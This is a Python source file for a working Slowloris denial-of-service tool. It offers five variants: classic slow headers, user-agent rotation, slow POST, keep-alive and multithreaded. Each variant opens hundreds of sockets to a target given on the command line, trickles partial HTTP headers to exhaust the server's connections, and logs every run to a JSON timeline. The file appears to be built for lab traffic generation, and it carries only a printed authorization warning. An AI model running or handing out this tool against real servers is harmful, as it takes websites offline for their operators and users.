# dos_slowloris.py
import socket
import threading
import time
import random
import string
import json
from datetime import datetime

# ======== CONFIG ========
TARGET_IP = "192.168.17.134"
TARGET_PORT = 80
LOG_FILE = "slowloris_timeline.json"

class SlowlorisAttackGenerator:
    """Slowloris DoS Attack Generator"""
    
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attacks = []
        self.connections_made = 0
        self.headers_sent = 0
        self.stop_attack = False
    
    def log_attack_start(self, attack_type, description):
        """تسجيل بداية الهجوم"""
        self.current_attack = {
            "attack_type": attack_type,
            "description": description,
            "target_ip": self.target_ip,
            "target_port": self.target_port,
            "start_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f'),
            "start_timestamp": time.time(),
        }
        print(f"\n{'='*60}")
        print(f"[+] Attack: {attack_type}")
        print(f"[+] Description: {description}")
        print(f"[+] Target: {self.target_ip}:{self.target_port}")
        print(f"[+] Start: {self.current_attack['start_time']}")
        print(f"{'='*60}\n")
        
        self.stop_attack = False
        self.connections_made = 0
        self.headers_sent = 0
    
    def log_attack_end(self):
        """تسجيل نهاية الهجوم"""
        self.stop_attack = True
        
        self.current_attack['end_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')
        self.current_attack['end_timestamp'] = time.time()
        self.current_attack['duration_seconds'] = round(
            self.current_attack['end_timestamp'] - self.current_attack['start_timestamp'], 2
        )
        self.current_attack['connections_made'] = self.connections_made
        self.current_attack['headers_sent'] = self.headers_sent
        
        print(f"\n[✓] Attack completed")
        print(f"[✓] Duration: {self.current_attack['duration_seconds']}s")
        print(f"[✓] Connections: {self.connections_made}")
        print(f"[✓] Headers: {self.headers_sent}\n")
        
        self.attacks.append(self.current_attack)
    
    def save_timeline(self):
        """حفظ الـ timeline"""
        with open(LOG_FILE, 'w') as f:
            json.dump(self.attacks, f, indent=2)
        
        print(f"\n[✓] Timeline saved to: {LOG_FILE}")
        self.print_summary()
    
    def print_summary(self):
        """طباعة ملخص"""
        print("\n" + "="*60)
        print("SLOWLORIS ATTACK SUMMARY")
        print("="*60)
        
        for i, attack in enumerate(self.attacks, 1):
            print(f"\n#{i} - {attack['attack_type']}")
            print(f"   Duration: {attack['duration_seconds']}s")
            print(f"   Connections: {attack['connections_made']}")
            print(f"   Headers: {attack['headers_sent']}")
        
        print("\n" + "="*60)


def random_string(length):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))


# ======== 1. Classic Slowloris ========
def slowloris_classic(attacker, duration=60, connections=200):
    """Classic Slowloris - إرسال headers ببطء"""
    attacker.log_attack_start("SLOWLORIS_CLASSIC", "Classic slow headers attack")
    
    sockets_list = []
    
    def create_socket():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((attacker.target_ip, attacker.target_port))
            
            sock.send(f"GET /{random_string(10)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {attacker.target_ip}\r\n".encode())
            
            attacker.connections_made += 1
            return sock
        except:
            return None
    
    print(f"  [*] Creating {connections} connections...")
    for _ in range(connections):
        sock = create_socket()
        if sock:
            sockets_list.append(sock)
    
    print(f"  [*] Established {len(sockets_list)} connections")
    
    end_time = time.time() + duration
    
    while time.time() < end_time:
        print(f"  [{datetime.now().strftime('%H:%M:%S')}] Active: {len(sockets_list)}")
        
        for sock in list(sockets_list):
            try:
                sock.send(f"X-{random_string(5)}: {random_string(10)}\r\n".encode())
                attacker.headers_sent += 1
            except:
                sockets_list.remove(sock)
        
        while len(sockets_list) < connections and time.time() < end_time:
            sock = create_socket()
            if sock:
                sockets_list.append(sock)
        
        time.sleep(15)
    
    for sock in sockets_list:
        try:
            sock.close()
        except:
            pass
    
    attacker.log_attack_end()


# ======== 2. Slowloris with User-Agent Variation ========
def slowloris_useragent_variation(attacker, duration=60, connections=200):
    """Slowloris مع User-Agents مختلفة"""
    attacker.log_attack_start("SLOWLORIS_USERAGENT", "Slowloris with varying user agents")
    
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
        'Mozilla/5.0 (X11; Linux x86_64)',
        'Slowloris/1.0',
    ]
    
    sockets_list = []
    
    def create_socket():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((attacker.target_ip, attacker.target_port))
            
            sock.send(f"GET /{random_string(10)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {attacker.target_ip}\r\n".encode())
            sock.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode())
            
            attacker.connections_made += 1
            return sock
        except:
            return None
    
    print(f"  [*] Creating {connections} connections...")
    for _ in range(connections):
        sock = create_socket()
        if sock:
            sockets_list.append(sock)
    
    end_time = time.time() + duration
    
    while time.time() < end_time:
        print(f"  [{datetime.now().strftime('%H:%M:%S')}] Active: {len(sockets_list)}")
        
        for sock in list(sockets_list):
            try:
                sock.send(f"X-{random_string(8)}: {random_string(15)}\r\n".encode())
                attacker.headers_sent += 1
            except:
                sockets_list.remove(sock)
        
        while len(sockets_list) < connections and time.time() < end_time:
            sock = create_socket()
            if sock:
                sockets_list.append(sock)
        
        time.sleep(12)
    
    for sock in sockets_list:
        try:
            sock.close()
        except:
            pass
    
    attacker.log_attack_end()


# ======== 3. Slowloris POST Method ========
def slowloris_post(attacker, duration=60, connections=150):
    """Slowloris مع POST method"""
    attacker.log_attack_start("SLOWLORIS_POST", "Slowloris using POST method")
    
    sockets_list = []
    
    def create_socket():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((attacker.target_ip, attacker.target_port))
            
            sock.send(f"POST /{random_string(10)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {attacker.target_ip}\r\n".encode())
            sock.send("Content-Type: application/x-www-form-urlencoded\r\n".encode())
            sock.send("Content-Length: 1000000\r\n".encode())
            
            attacker.connections_made += 1
            return sock
        except:
            return None
    
    print(f"  [*] Creating {connections} POST connections...")
    for _ in range(connections):
        sock = create_socket()
        if sock:
            sockets_list.append(sock)
    
    end_time = time.time() + duration
    
    while time.time() < end_time:
        print(f"  [{datetime.now().strftime('%H:%M:%S')}] Active: {len(sockets_list)}")
        
        for sock in list(sockets_list):
            try:
                sock.send(f"X-{random_string(6)}: {random_string(12)}\r\n".encode())
                attacker.headers_sent += 1
            except:
                sockets_list.remove(sock)
        
        while len(sockets_list) < connections and time.time() < end_time:
            sock = create_socket()
            if sock:
                sockets_list.append(sock)
        
        time.sleep(10)
    
    for sock in sockets_list:
        try:
            sock.close()
        except:
            pass
    
    attacker.log_attack_end()


# ======== 4. Slowloris with Keep-Alive ========
def slowloris_keepalive(attacker, duration=60, connections=180):
    """Slowloris مع Keep-Alive"""
    attacker.log_attack_start("SLOWLORIS_KEEPALIVE", "Slowloris with Keep-Alive headers")
    
    sockets_list = []
    
    def create_socket():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((attacker.target_ip, attacker.target_port))
            
            sock.send(f"GET /{random_string(10)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {attacker.target_ip}\r\n".encode())
            sock.send("Connection: keep-alive\r\n".encode())
            sock.send("Keep-Alive: timeout=900\r\n".encode())
            
            attacker.connections_made += 1
            return sock
        except:
            return None
    
    print(f"  [*] Creating {connections} keep-alive connections...")
    for _ in range(connections):
        sock = create_socket()
        if sock:
            sockets_list.append(sock)
    
    end_time = time.time() + duration
    
    while time.time() < end_time:
        print(f"  [{datetime.now().strftime('%H:%M:%S')}] Active: {len(sockets_list)}")
        
        for sock in list(sockets_list):
            try:
                sock.send(f"X-{random_string(7)}: {random_string(14)}\r\n".encode())
                attacker.headers_sent += 1
            except:
                sockets_list.remove(sock)
        
        while len(sockets_list) < connections and time.time() < end_time:
            sock = create_socket()
            if sock:
                sockets_list.append(sock)
        
        time.sleep(14)
    
    for sock in sockets_list:
        try:
            sock.close()
        except:
            pass
    
    attacker.log_attack_end()


# ======== 5. Slowloris Multi-Thread ========
def slowloris_multithread(attacker, duration=60, threads=10, connections_per_thread=20):
    """Slowloris مع threads متعددة"""
    attacker.log_attack_start("SLOWLORIS_MULTITHREAD", "Multi-threaded Slowloris")
    
    def thread_worker():
        sockets_list = []
        
        def create_socket():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((attacker.target_ip, attacker.target_port))
                
                sock.send(f"GET /{random_string(10)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {attacker.target_ip}\r\n".encode())
                
                attacker.connections_made += 1
                return sock
            except:
                return None
        
        for _ in range(connections_per_thread):
            sock = create_socket()
            if sock:
                sockets_list.append(sock)
        
        end_time = time.time() + duration
        
        while time.time() < end_time:
            for sock in list(sockets_list):
                try:
                    sock.send(f"X-{random_string(5)}: {random_string(10)}\r\n".encode())
                    attacker.headers_sent += 1
                except:
                    sockets_list.remove(sock)
            
            while len(sockets_list) < connections_per_thread and time.time() < end_time:
                sock = create_socket()
                if sock:
                    sockets_list.append(sock)
            
            time.sleep(15)
        
        for sock in sockets_list:
            try:
                sock.close()
            except:
                pass
    
    print(f"  [*] Launching {threads} threads...")
    
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=thread_worker, daemon=True)
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join()
    
    attacker.log_attack_end()


# ======== MAIN ========
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Slowloris DoS Attack Generator')
    parser.add_argument('-t', '--target', required=True, help='Target IP')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port')
    parser.add_argument('-d', '--duration', type=int, default=60,
                       help='Attack duration per type (seconds)')
    parser.add_argument('-a', '--attack',
                       choices=['classic', 'useragent', 'post', 'keepalive', 'multithread', 'all'],
                       default='all',
                       help='Attack type')
    
    args = parser.parse_args()
    
    global TARGET_IP, TARGET_PORT
    TARGET_IP = args.target
    TARGET_PORT = args.port
    
    print("\n" + "="*60)
    print("SLOWLORIS DoS ATTACK GENERATOR")
    print("="*60)
    print(f"Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"Attack: {args.attack}")
    print(f"Duration: {args.duration}s per attack")
    print("="*60 + "\n")
    
    print("⚠️  WARNING: Use only in authorized environments!\n")
    
    input("Press ENTER to start...")
    
    attacker = SlowlorisAttackGenerator(TARGET_IP, TARGET_PORT)
    
    try:
        if args.attack == 'classic':
            slowloris_classic(attacker, args.duration)
        elif args.attack == 'useragent':
            slowloris_useragent_variation(attacker, args.duration)
        elif args.attack == 'post':
            slowloris_post(attacker, args.duration)
        elif args.attack == 'keepalive':
            slowloris_keepalive(attacker, args.duration)
        elif args.attack == 'multithread':
            slowloris_multithread(attacker, args.duration)
        elif args.attack == 'all':
            attacks = [
                ('Classic', slowloris_classic),
                ('User-Agent Variation', slowloris_useragent_variation),
                ('POST Method', slowloris_post),
                ('Keep-Alive', slowloris_keepalive),
                ('Multi-Thread', slowloris_multithread),
            ]
            
            for name, attack_func in attacks:
                print(f"\n>>> Starting {name} <<<")
                attack_func(attacker, args.duration)
                print(f"\n[*] Waiting 10 seconds...\n")
                time.sleep(10)
    
    except KeyboardInterrupt:
        print("\n\n[!] Stopped by user")
    
    finally:
        attacker.save_timeline()


if __name__ == "__main__":
    main()
